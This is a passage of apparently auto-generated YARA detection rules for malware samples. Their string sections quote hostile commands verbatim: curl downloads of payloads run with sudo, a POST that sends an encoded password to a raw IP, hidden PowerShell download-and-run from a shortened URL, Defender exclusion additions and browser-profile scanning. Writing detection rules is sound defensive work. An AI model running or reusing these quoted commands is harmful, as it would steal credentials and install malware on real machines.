   strings:
      $s1 = "SpyYT|&7 " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 4000KB and
      all of them
}

rule sig_22c8c8daadb1ad3931ceca1c3931ebb3639357bdb42ea25ecc7813ac395516bf_22c8c8da {
   meta:
      description = "_subset_batch - file 22c8c8daadb1ad3931ceca1c3931ebb3639357bdb42ea25ecc7813ac395516bf_22c8c8da.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "22c8c8daadb1ad3931ceca1c3931ebb3639357bdb42ea25ecc7813ac395516bf"
   strings:
      $s1 = "nomousy/nomousy.exe" fullword ascii /* score: '19.00'*/
      $s2 = "nomousy/nomousy.bat" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 30KB and
      all of them
}

rule sig_230310da3b150392f7455fba2040262cb4160cf4fbee89ea900a34a558a31194_230310da {
   meta:
      description = "_subset_batch - file 230310da3b150392f7455fba2040262cb4160cf4fbee89ea900a34a558a31194_230310da.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "230310da3b150392f7455fba2040262cb4160cf4fbee89ea900a34a558a31194"
   strings:
      $s1 = "pe.txt" fullword ascii /* score: '8.00'*/
      $s2 = "Skype.ps1" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 200KB and
      all of them
}

rule sig_421f9b482afe9ad930995c58d708fe71d1722f3d4c4b720436c4dc6f54a485e3_421f9b48 {
   meta:
      description = "_subset_batch - file 421f9b482afe9ad930995c58d708fe71d1722f3d4c4b720436c4dc6f54a485e3_421f9b48.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "421f9b482afe9ad930995c58d708fe71d1722f3d4c4b720436c4dc6f54a485e3"
   strings:
      $s1 = "pe.txt" fullword ascii /* score: '8.00'*/
      $s2 = "Skype.ps1" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 100KB and
      all of them
}

rule sig_7169e640a989c8a9ccfd5f9e6c0d843421c6aad1730bec1cae36c25d7b848a82_7169e640 {
   meta:
      description = "_subset_batch - file 7169e640a989c8a9ccfd5f9e6c0d843421c6aad1730bec1cae36c25d7b848a82_7169e640.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7169e640a989c8a9ccfd5f9e6c0d843421c6aad1730bec1cae36c25d7b848a82"
   strings:
      $s1 = "pe.txt" fullword ascii /* score: '8.00'*/
      $s2 = "Skype.ps1" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 100KB and
      all of them
}

rule sig_5beddaa836a46d24de68d0b3a853c7aebb08ca5b10f8d3572cadb05ca5ad47ef_5beddaa8 {
   meta:
      description = "_subset_batch - file 5beddaa836a46d24de68d0b3a853c7aebb08ca5b10f8d3572cadb05ca5ad47ef_5beddaa8.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5beddaa836a46d24de68d0b3a853c7aebb08ca5b10f8d3572cadb05ca5ad47ef"
   strings:
      $s1 = "        var chaundler = diasystem.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        var tracheophones = diasystem.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        this[\"buccinidae\"] = this[\"submodels\"].GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g('\" + this[\"phrasemonger\"] + \"'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule sig_784484a2b552ac25de7d1c15abb521d9c8803af062349e65349f6cd3e97f24c1_784484a2 {
   meta:
      description = "_subset_batch - file 784484a2b552ac25de7d1c15abb521d9c8803af062349e65349f6cd3e97f24c1_784484a2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "784484a2b552ac25de7d1c15abb521d9c8803af062349e65349f6cd3e97f24c1"
   strings:
      $x1 = "Dyrlge.ShellExecute(\"explorer.exe\",Preenu + \"\\system32\\MRT.exe\",\"\",\"open\",0);" fullword ascii /* score: '37.00'*/
      $s2 = "//Systers nonstarch? salably unwaivering puget; temperamaleriers? paakrslen tindens129 phytosterol: sigtelinies, socialpdagogen " ascii /* score: '27.00'*/
      $s3 = "//Skriveskriftens stamkafyq pewy: pilgrimize. rafraichisseur, contradistinctly220: velsers salgsindsatsen provenient! hovedprogr" ascii /* score: '25.00'*/
      $s4 = "//skarnspanden; kateterets ballades? coumarin tbrudsskadens offer prettyism. withstand: efterkommelsesfristernes bisiliac nonapo" ascii /* score: '25.00'*/
      $s5 = "//Blendure, uskadelighedens; vrdipapircentralerne! byrom unvagrantly. chastines skrmmeddelelsers, roughishly penibel: gennemarbe" ascii /* score: '24.00'*/
      $s6 = "Thymeli = Preenu + '\\\\system32\\\\WindowsPower'+Michi+'hell\\\\v1.0\\\\power'+Michi+'hell.exe';" fullword ascii /* score: '23.00'*/
      $s7 = "//Efteraarsfarvers, forladtheds indgriben laryngostenosis. chirurgical: forbrugerbevidst, eneid. smaskene rygerkupeens underprio" ascii /* score: '23.00'*/
      $s8 = "Arshin76.Item(0).Document.Application.ShellExecute(Thymeli,String.fromCharCode(34)+Hjlpevirks253+String.fromCharCode(34),\"\",\"" ascii /* score: '21.00'*/
      $s9 = "Arshin76.Item(0).Document.Application.ShellExecute(Thymeli,String.fromCharCode(34)+Hjlpevirks253+String.fromCharCode(34),\"\",\"" ascii /* score: '21.00'*/
      $s10 = "//Pkge kunstnerens, klatret! pipy? dykkede paganalian228 albylernes193! hnsefoder? myndes. grants tricentennials elevates gests:" ascii /* score: '21.00'*/
      $s11 = "//Omophagist samkvemsmuligheds overtrukne plantago? demagogen. anneksionernes ridderslaget. tildannelserne, raglanite shoulderer" ascii /* score: '20.00'*/
      $s12 = "//bemidlede; handkerchiefs: suggestivt. mana69 styringskort; kemofiber249! statsmagters! infraoral203? beskrersakse! acronymize," ascii /* score: '20.00'*/
      $s13 = "//Fortoldningens, spredningsmeteorologiskes; armpad9. hospitalize arveafgiftsberegningens raekkeudvikling programmelkonstruktion" ascii /* score: '20.00'*/
      $s14 = "auts relationsoperatorens gravmlets; socialstyrelse isospondyli! afsendelsesprioriteringers skruebrkker bypass! jarnes driftssik" ascii /* score: '20.00'*/
      $s15 = "//Udstrningers! attemptability logget? proselyter essayers! amphicarpium, vokalisering? unsimulative garroted241, morigerously10" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_247fdba5fbfd076d9c530d937406aa097d6794b9af26bfc64bf6ea765ed51a50_247fdba5 {
   meta:
      description = "_subset_batch - file 247fdba5fbfd076d9c530d937406aa097d6794b9af26bfc64bf6ea765ed51a50_247fdba5.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "247fdba5fbfd076d9c530d937406aa097d6794b9af26bfc64bf6ea765ed51a50"
   strings:
      $x1 = "curl -sk -A 206 -o /var/tmp/downx64.sh https://raw.githubusercontent.com/RominaMabelRamirez/dify/refs/heads/bai/api/downx64.sh" fullword ascii /* score: '38.00'*/
      $s2 = "curl -X POST -H \"Content-Type: text/plain\" --data $bpaswor http://172.86.93.139:3000/pawr/ &" fullword ascii /* score: '26.00'*/
      $s3 = "bpaswor=$(echo -n $MY_PASWOR | base64)" fullword ascii /* score: '12.00'*/
      $s4 = "echo $MY_PASWOR | sudo -S chmod +x /var/tmp/downx64.sh" fullword ascii /* score: '11.00'*/
      $s5 = "echo $MY_PASWOR | sudo -S sh /var/tmp/downx64.sh &" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_65665c3faba4fbfed12488e945306b10131afb9d3ad928accdcef75e0945a086_65665c3f {
   meta:
      description = "_subset_batch - file 65665c3faba4fbfed12488e945306b10131afb9d3ad928accdcef75e0945a086_65665c3f.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "65665c3faba4fbfed12488e945306b10131afb9d3ad928accdcef75e0945a086"
   strings:
      $x1 = "curl -k -A 207 -o ~/.n3/payuniversal2 https://raw.githubusercontent.com/RominaMabelRamirez/dify/refs/heads/bai/api/payuniversal2" ascii /* score: '38.00'*/
      $x2 = "curl -k -A 205 -o /var/tmp/x64nvidia https://raw.githubusercontent.com/RominaMabelRamirez/dify/refs/heads/bai/api/x64nvidia" fullword ascii /* score: '38.00'*/
      $s3 = "# Run the appropriate command" fullword ascii /* score: '19.00'*/
      $s4 = "if [ ! -x /usr/bin/python3 ]; then" fullword ascii /* score: '15.00'*/
      $s5 = "  /usr/bin/python3 ~/.npc" fullword ascii /* score: '14.00'*/
      $s6 = "mkdir -p ~/.n3" fullword ascii /* score: '12.00'*/
      $s7 = "  if [ -f ~/.npc ]; then" fullword ascii /* score: '12.00'*/
      $s8 = "echo $MY_PASWOR | sudo -S /var/tmp/x64nvidia &" fullword ascii /* score: '11.00'*/
      $s9 = "echo $MY_PASWOR | sudo -S chmod +x /var/tmp/x64nvidia" fullword ascii /* score: '11.00'*/
      $s10 = "echo $MY_PASWOR | sudo -S chmod +x ~/.n3/payuniversal2" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      1 of ($x*) and all of them
}

rule sig_24d7520206452bbe32986b7d5347150ad2e33acdee1ab622dbe53d91d96ae88e_24d75202 {
   meta:
      description = "_subset_batch - file 24d7520206452bbe32986b7d5347150ad2e33acdee1ab622dbe53d91d96ae88e_24d75202.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "24d7520206452bbe32986b7d5347150ad2e33acdee1ab622dbe53d91d96ae88e"
   strings:
      $x1 = "echo qfyxkjdbmayhdzjnblrmugjsafyaorihmdjjmlwpungnlsudrpblomwdiggoixdrkyxhyjsgcbllvkfcgsycuhndbzxevvkimcxkgrhorfsqyksibofntpqlpag" ascii /* score: '64.00'*/
      $x2 = "start /min cmd /c \"powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://tinyurl.com/mh1-m1-9625' -OutFile '%" ascii /* score: '55.00'*/
      $x3 = "EMP%\\rm1-9625.bat'; Start-Process -FilePath '%TEMP%\\rm1-9625.bat' -WindowStyle Hidden\"" fullword ascii /* score: '41.00'*/
      $x4 = "    powershell -WindowStyle Hidden -Command \"Start-Process -FilePath '%~f0' -ArgumentList elevated -Verb RunAs\"" fullword ascii /* score: '40.00'*/
      $x5 = "start /min cmd /c \"powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://tinyurl.com/mh1-m1-9625' -OutFile '%" ascii /* score: '39.00'*/
      $s6 = "aajzgyryjopekfqkkjhdkkicwyfzlrbqimmujfpodrrwwfnbmbjlkgqtzhujfdiixjdjyxqejbshzauvqrkspmbluywyaigqdbaircwjjiwwbzdxcrxylmqspygticls" ascii /* score: '18.00'*/
      $s7 = "qvdxqrlzkhnzvgmbrcjzqgbenkiwthqfvnmwiwlpuibovspycircyasoasvzwtshblmefreriaxskcehipbxbxghctjnrotpmkptbydmjrsnyxfuofqyttgpkplsmgvf" ascii /* score: '18.00'*/
      $s8 = "ekpwccnpyiydlxgcqzyyitghoefvgsgthirckbardykeylbmczpceefbxbuikibmyrrelmdexonltiotyrzlqmunfinabgrzdvoiqkiukhlipbcqlgmpyjumwljqguoe" ascii /* score: '16.00'*/
      $s9 = "wgircuoduhwapxpxiaspljiaenkzvjwzhenvhmnetlsfcbjcmtssghgmieqedehntsvoqzlklizhifkmryijywkdfmcxymbttlooxulaascomelkkkutyqixdtoxgjgg" ascii /* score: '16.00'*/
      $s10 = "krunmxolsojwuiajiumovexezzlbiufnchtbpbvjuirlaydllyljyvrwpenkdalpsxruhtdvtdgjviesnqvgtbswbcnocejlibtemvqncycnryjdarysssqquaqnkscv" ascii /* score: '16.00'*/
      $s11 = "set FLAGFILE=%TEMP%\\admin.ok" fullword ascii /* score: '15.00'*/
      $s12 = "phczuniinwbcfpsdpreazjbhyelafgzvttsgcevhvmqqybpkkcqgbxcyyyykbdtmppvotcmrvzmegpfpypdxmogbegwakqxmzzrbuglfhpoyzswqgwuzfwayphwlqgja" ascii /* score: '14.00'*/
      $s13 = "cyptiuvzmfrevzwzghkyftxcpqrqpahhpkibgufozlwdzazszqbygduyohbntmpfzwuftztreadhcmfnwvkmnishaophilebxkksenszmhgotmclyzfllywvamnwlyza" ascii /* score: '14.00'*/
      $s14 = "yoatsrvqcpxwiqhhcwhkkanmawalsnlonqyhzlzqydabmaiyjysbezpcgxsgwbvfuncjzyklwiusjfsajssgtfvqjtpipezcpcclbtmlwdmnpdmbarwrsnlcnszgvrhd" ascii /* score: '14.00'*/
      $s15 = "nngkfonwkzveliguafxswqnrzgjrdwixgoxkkahiftwoexyrjnzcjbnrvydeumgftcixcomwwpmtegxxmghrqvqhgywdjlzurkeymelpbpfiicetfholzvnbmaodkkxd" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule sig_3659ac46a884e4e2774c9c6f3230f65af5c517d365ee16cffd50027d1d725f83_3659ac46 {
   meta:
      description = "_subset_batch - file 3659ac46a884e4e2774c9c6f3230f65af5c517d365ee16cffd50027d1d725f83_3659ac46.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3659ac46a884e4e2774c9c6f3230f65af5c517d365ee16cffd50027d1d725f83"
   strings:
      $x1 = "echo wdmvjawkwrqvsofgbjzbcwyrhzqysvsvcqpgtufdbjkriblhsmwyfadixxdjndbxjmictjmpacjulbkwytylpqzidjgjylwuigpfgtzykejptcruhtlepdwoeau" ascii /* score: '61.00'*/
      $s2 = "%VAR0:~57,1%%VAR0:~57,1%%VAR0:~57,1%%VAR0:~57,1%%VAR0:~9,1%%VAR0:~51,1%%VAR0:~1,1%%VAR0:~34,1%%VAR0:~30,1%%VAR0:~6,1%%VAR0:~11,1" ascii /* score: '23.00'*/
      $s3 = "-ArgumentList elevated -Verb RunAs\"" fullword ascii /* score: '23.00'*/
      $s4 = "vchxpuvlfwvpkfoseqssuipxjqxsjwizxkidqkncuyezgrefminvtongebazxdllbjzjrlogexprvpgtfiuxogrsjhqjqfzsrffrlkrmtxkvjvdcomawxwbyrdtwukjh" ascii /* score: '21.00'*/
      $s5 = "mmwxjflogrunwphnhxbisqdbyvwanvchvgvbqykszulculubqgebobmfbubphyslcomzdfzdllkrusbjvweaststhxsqclfikzvaycpmerbanrcawkmojleglphgtmbt" ascii /* score: '20.00'*/
      $s6 = "bnsscouzoemdrxsbaheignnqunawnzeexcdauveqkscmwxqqukvsclrvjljgooibsourdumpemuaaxmjfnoeqnjdqojyuhnbukssbnofrvxyvpvqybbezkxkvrwkivxc" ascii /* score: '18.00'*/
      $s7 = "ckfgcqzxpuakcwlogzsfockubndnfwviouidllhipnbjyocoftbouizfjissjqehekegcjawalpykllkvnyvxsrauazdncylwfmcxglmxhkwvpondeutxwsyoawoyjum" ascii /* score: '18.00'*/
      $s8 = "mljqdounuqoozqpuijamvmdncbsoyhohnztaanoggtmpprqwdzwvkmsloaiprnamkajzhovlxgvbnhlhteatikqzepbxbeduapdfvqinamnqkfutmwizmdhndgxycftp" ascii /* score: '16.00'*/
      $s9 = "lbremwtfpbrrohfxobvksqavnlvynxrdlakeyealjorvsxawmmfgoxkqztetljeblzjcocqbxoobzwkiezvdqvqlwatakleoamlvjeitrhjifwxhizoubjfxmcxkjmsr" ascii /* score: '16.00'*/
      $s10 = "cyemeybuerpqnfyjoyymaxvebtucxtedrxtyakeydvwyqgoaxumnjwbvaxgqbilhlsohuffomoyoitkavfkdzwacumnuzeeddvbqwsmtpqklyqnbzimvdasggpnqtoxv" ascii /* score: '16.00'*/
      $s11 = "qmuzhhuhqcdsymssdiizpwljfaphoqvmnfrjimrwgplqutvblkixfxnaxfgoykexecyyzvzajqdznjxtqjwywanwomyarzovrvgentnudekwayuwpxamlipflvpwybcn" ascii /* score: '16.00'*/
      $s12 = "hiktowejisbovbfyuubyweiptnqwfwkhpcueghhhwftpwdnglpewhtcmnterytrqgyfduijzsxdugsqywypcfwgokrtelkavqeygokstwhjcsxwafsgmcomnfnlxoqbo" ascii /* score: '16.00'*/
      $s13 = "mcgyahpfkddfgsyxlvijgwgilepcmdllalweghhmcgoowmvyrkvvmitfbhsbpchnfhvzzakubmstcenqwrtrxotopqhfjtafjwopepkpvzxmxjmkwfacezruwxoelzyc" ascii /* score: '16.00'*/
      $s14 = "dcyktaetlryltqmhbttmmsubvzqzmmvvcjiesxyvymkkwzjhmssvgwihhrmhoiglogxgmjkevbaqmubtsabxtastdiryfiogaizazqwikevklivuxnelxtklgcmdkbor" ascii /* score: '16.00'*/
      $s15 = "cgqejchqocmdxaczvqhctiiyhxsqceebzbtmfphsiuqdyxkisxeprqxbklepzcganstcovvswoqbplvvkwvdwrespygurnvxseifwqdclwtiouppklnrciqlnxbjnriy" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6365 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_3766a8654d3954c8c91e658fa8f8ddcd6844a13956318242a31f52e205d467d0_3766a865 {
   meta:
      description = "_subset_batch - file 3766a8654d3954c8c91e658fa8f8ddcd6844a13956318242a31f52e205d467d0_3766a865.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3766a8654d3954c8c91e658fa8f8ddcd6844a13956318242a31f52e205d467d0"
   strings:
      $s1 = "call :scan_les2 \"Opera Stable\" \"%APPDATA%\\Opera Software\\Opera Stable\"" fullword ascii /* score: '24.00'*/
      $s2 = "call :scan_ext_dir \"Opera GX\" \"%APPDATA%\\Opera Software\\Opera GX Stable\\Extensions\"" fullword ascii /* score: '24.00'*/
      $s3 = "set \"FOUND_FILE=%TEMP%\\ext_found_list.txt\"" fullword ascii /* score: '22.00'*/
      $s4 = "call :scan_les2 \"Opera GX2\"     \"%APPDATA%\\Opera Software\\Opera GX Stable\"" fullword ascii /* score: '19.00'*/
      $s5 = "for /f \"tokens=1,* delims==\" %%A in ('2^>nul set name.%~1') do set \"NAME=%%B\"" fullword ascii /* score: '19.00'*/
      $s6 = "call :scan_les  \"Brave\"       \"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\"" fullword ascii /* score: '17.00'*/
      $s7 = "call :scan_les  \"Edge\"        \"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\"" fullword ascii /* score: '17.00'*/
      $s8 = "call :scan_les  \"Chrome\"      \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\"" fullword ascii /* score: '17.00'*/
      $s9 = ":: call :scan_ext_dir \"Edge\"    \"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Extensions\"" fullword ascii /* score: '17.00'*/
      $s10 = "call :scan_les  \"Vivaldi\"     \"%LOCALAPPDATA%\\Vivaldi\\User Data\"" fullword ascii /* score: '17.00'*/
      $s11 = "  for /d %%P in (\"%BASE%\\*\") do (" fullword ascii /* score: '16.00'*/
      $s12 = ":: -------- SUBROUTINES --------" fullword ascii /* score: '12.00'*/
      $s13 = ":: --- SUMMARY ACCUMULATOR (file-based, for reliable newlines) ---" fullword ascii /* score: '12.00'*/
      $s14 = ":: --- OPTIONAL FRIENDLY NAMES (leave empty to show ID) ---" fullword ascii /* score: '12.00'*/
      $s15 = "  echo [%BROWSER%] user data not found at \"%BASE%\"" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 10KB and
      8 of them
}

rule sig_45843c4aba63cba8c3c23aeb702550269ee704371ce687c94d4440149fba598c_45843c4a {
   meta:
      description = "_subset_batch - file 45843c4aba63cba8c3c23aeb702550269ee704371ce687c94d4440149fba598c_45843c4a.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "45843c4aba63cba8c3c23aeb702550269ee704371ce687c94d4440149fba598c"
   strings:
      $s1 = "lICR0bXBcfi56aXA7IEV4cGFuZC1BcmNoaXZlIC1QYXRoICR0bXBcfi56aXAgLURlc3RpbmF0aW9uUGF0aCBDOlxkb3duIC1Gb3JjZTsgU3RhcnQtUHJvY2VzcyAnQzp" ascii /* base64 encoded string ' $tmp\~.zip; Expand-Archive -Path $tmp\~.zip -DestinationPath C:\down -Force; Start-Process 'C:' */ /* score: '21.00'*/
      $s2 = "certutil -decode llIlIllllIlllIll.txt IllIIlIlIllllIlI.bat >nul 2>&1" fullword ascii /* score: '17.00'*/
      $s3 = "tQ29tbWFuZCAiJHRtcD0kZW52OnRtcDsgaXdyICdodHRwczovL3RoZS5lYXJ0aC5saS9+c2d0YXRoYW0vcHV0dHkvbGF0ZXN0L3c2NC9wdXR0eS56aXAnIC1PdXRGaWx" ascii /* base64 encoded string 'Command "$tmp=$env:tmp; iwr 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.zip' -OutFil' */ /* score: '17.00'*/
      $s4 = "del IllIIlIlIllllIlI.bat" fullword ascii /* score: '15.00'*/
      $s5 = "cZG93blxwdXR0eS5leGUnOyI= > llIlIllllIlllIll.txt" fullword ascii /* score: '11.00'*/
      $s6 = "call IllIIlIlIllllIlI.bat" fullword ascii /* score: '11.00'*/
      $s7 = "del llIlIllllIlllIll.txt" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 2KB and
      all of them
}

rule sig_5533c4c461fe08f8ff000d14998f590f52d840be2263ccaa100ab49a4ae51f5e_5533c4c4 {
   meta:
      description = "_subset_batch - file 5533c4c461fe08f8ff000d14998f590f52d840be2263ccaa100ab49a4ae51f5e_5533c4c4.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5533c4c461fe08f8ff000d14998f590f52d840be2263ccaa100ab49a4ae51f5e"
   strings:
      $x1 = "powershell -Command \"try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%'; Write-Host 'File successfully downloaded" ascii /* score: '34.00'*/
      $x2 = "powershell -Command \"try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%'; Write-Host 'File successfully downloaded" ascii /* score: '33.00'*/
      $x3 = "powershell -Command \"try { Add-MpPreference -ExclusionPath $env:USERPROFILE\\Downloads; Write-Host 'Downloads folder successful" ascii /* score: '33.00'*/
      $x4 = "powershell -Command \"try { Add-MpPreference -ExclusionPath $env:USERPROFILE\\Downloads; Write-Host 'Downloads folder successful" ascii /* score: '32.00'*/
      $s5 = "echo Executing the downloaded file: %outputFilePath%" fullword ascii /* score: '26.00'*/
      $s6 = "to %outputFilePath%' -ForegroundColor Green } catch { Write-Host 'Failed to download the file.' -ForegroundColor Red; exit 1 }\"" ascii /* score: '22.00'*/
      $s7 = "set \"url=https://github.com/Iamunknownhk/testexer/raw/refs/heads/main/output.exe\"" fullword ascii /* score: '22.00'*/
      $s8 = "set \"outputFilePath=%USERPROFILE%\\Downloads\\%outputFileName%\"" fullword ascii /* score: '20.00'*/
      $s9 = " added to exclusions.' -ForegroundColor Green } catch { Write-Host 'Failed to add Downloads folder to antivirus exclusions.' -Fo" ascii /* score: '18.00'*/
      $s10 = ":: Run the downloaded file" fullword ascii /* score: '13.00'*/
      $s11 = "timeout /t 1 >nul" fullword ascii /* score: '12.00'*/
      $s12 = "set \"outputFileName=ZOOM.exe\"" fullword ascii /* score: '11.00'*/
      $s13 = ":: Download the file" fullword ascii /* score: '10.00'*/
      $s14 = ":: Add the Downloads folder to antivirus exclusions (Windows Defender)" fullword ascii /* score: '10.00'*/
      $s15 = "echo WARNING: Running downloaded files can be risky. Ensure the source URL is trusted." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 4KB and
      1 of ($x*) and all of them
}

rule sig_5d604da269ed3a3301fdd6d7edaf16bf6ebcfdaf641d8f8d12cc6537af84ccd0_5d604da2 {
   meta:
      description = "_subset_batch - file 5d604da269ed3a3301fdd6d7edaf16bf6ebcfdaf641d8f8d12cc6537af84ccd0_5d604da2.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5d604da269ed3a3301fdd6d7edaf16bf6ebcfdaf641d8f8d12cc6537af84ccd0"
   strings:
      $x1 = "echo ycmeeooemavvzxumvrdqqfqmqadxetmyfzkqslkoksftneeqrqlzrabaptkaumhgiaygetlqzsnfzbyxxiltnlbivqursaraszdpnbgmsxiwtiksxwzppfqaghx" ascii /* score: '68.00'*/
      $s2 = "rgumentList elevated -Verb RunAs\"" fullword ascii /* score: '23.00'*/
      $s3 = "%VAR0:~8,1%%VAR0:~8,1%%VAR0:~8,1%%VAR0:~8,1%%VAR0:~15,1%%VAR0:~2,1%%VAR0:~41,1%%VAR0:~10,1%%VAR0:~58,1%%VAR0:~19,1%%VAR0:~64,1%%" ascii /* score: '23.00'*/
      $s4 = "lreamgcvnduwyozhvfsettzisbnetzymyylogpdaruzmkllodhsxdpwaiqtxibwjwxgetoeztmphemhvqipfzcwkzsuvwjoljkxgqwjkfplznrordphogbpzefcumcmz" ascii /* score: '21.00'*/
      $s5 = "kligcecwnwjmdmrwafvfqzsgubxwuywlipctpipelnxpsqliarhcyzbjfcpderwrdzfronahaqsvhworhlezsqjqvtxjglwoggdchmhovktfuvivranxaogciziqircf" ascii /* score: '19.00'*/
      $s6 = "klwsuxhxalkfsaulvdlndjaqmqqclgrbpxdsyawogwjngwlcdfnxsbwkofecchchqvxfkiucrctwuxgsyijodwkjugetukvwmqmdxqzzzuxmhgmqvmhzcyiozdsmdlli" ascii /* score: '18.00'*/
      $s7 = "jywdjqmdlvitasqxrxppxjdvbmogrifjwmpgxxuguajqtomotlgmebjtnaysctpvlognivblctpnbdllsclfnanohwvacbmmdrfnraufhotqqerjralzzoblbmgrynjj" ascii /* score: '18.00'*/
      $s8 = "uhenfiykowgmbmpreizsurwbfchntphswukhpiwmymtvydtczyuusmpbwzqchlokynemulrhyplgueuqztizecccuzlkbwueftpbpdxkuutzwalogvktpqcvhifmbtae" ascii /* score: '18.00'*/
      $s9 = "qbjtwvlovualjuhwtzvpjvqlrsmnzdqswmkixijmibxourrdpnmnrxjwhlzxjxptzksvtcrikosjkluroteagbgnupjvmiiqhkvbhcorsjaodadviewrqogqnhdumpwq" ascii /* score: '18.00'*/
      $s10 = "wfdsypabromapslogpdzsjiaybhkqmdvkmlhbfjxsvuynsyixgizdtzbiamnowywndspcucijwtzwrejutvlyeblfqfrjftlvenkahzulahdllfcwdzrzsilrxjmbrva" ascii /* score: '18.00'*/
      $s11 = "qrlelxryhlrmcqjfcpbzxiariguiisrkeytzfmlpskrfzwrjnzyruptbuhcrtrqmkonamajqfnklcyhamcksludlzoyijcijrcqsrwutsfsspxorpjxewynspyzgyern" ascii /* score: '16.00'*/
      $s12 = "ylpvkhqlwsjjxpehogydoyroumkceftetpixrbyjpkkqgggzexfkdpoiayrccudrdtrdoeohlmycogozjxwwvilhbavuzlkbyyaggpcztgjxanqwlotogetbinvkzibc" ascii /* score: '16.00'*/
      $s13 = "rpuxtszszhfaqgyabcbkqzgvmwjhmdlleoikgbvtfwrtzpmleyowwhexxkhsxsyplulrilrmwavtsrlbmgfoigxgjozzcejjvdygumnerigwwvpxvownbinrzzavsvfd" ascii /* score: '16.00'*/
      $s14 = "yclgcpuykegylrlljrioqmnvnmwjxdjzpugkzqzimqbawaupbimxavvklujiqnqllbtvxtgrdddllllreadjtwhnmpevpiyfswroyjhjcbyhpigzblytdfoyvugtabiv" ascii /* score: '16.00'*/
      $s15 = "wuawfgcfunoqwrmqvatggevkkondioqkiyutkskteiragbwippquzieiyhgtnqapibmpsxbgfsircreadhtpdbsqizfpxltrdapcyiwtihiyqdaqhqcjxepvzifhhrwz" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6365 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_6b3aa55ccab7066535a3a5fc403a16255c961cca031aa694eea8c90ea1b7f7f9_6b3aa55c {
   meta:
      description = "_subset_batch - file 6b3aa55ccab7066535a3a5fc403a16255c961cca031aa694eea8c90ea1b7f7f9_6b3aa55c.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6b3aa55ccab7066535a3a5fc403a16255c961cca031aa694eea8c90ea1b7f7f9"
   strings:
      $x1 = ":: 6JZiAACWYgAAn@X@JRMvT6QMdCFkruzPg4XW7@@+OL8t@@g@9Xh@@l9GHVR@kyT@i4A@AAAAk33O@jAaC79Bc@SmIzo2Za6rGbBTo/RM@A@oMz6k@+YdaIi6gQ1dM" ascii /* score: '34.00'*/
      $x2 = "%vioso%%vioso% OYawUzPmpNluZmMBMDCaHqxLChwGRRoVCnOZZiUpbPkoyOQUgpdpPHpzRPIDZurUXkkBLftQAZzOlqYNZCsYpFiTotrGWpMGINdRZzVKGEsdiybsE" ascii /* score: '32.00'*/
      $s3 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dAntIrqL%%HybCcosk% %sdqZxwXd% %LdpHInNi%%oYsjuewr% %MuzppFgM%%temp%%MokQwW" ascii /* score: '18.00'*/
      $s4 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%AfNYJSdd%%QNJHwMZf%%UQLDkhNg%%HybCcosk% %sdqZxwXd% %ObbPWxrc%%nnaqyDMS% %MuzppFgM%%te" ascii /* score: '18.00'*/
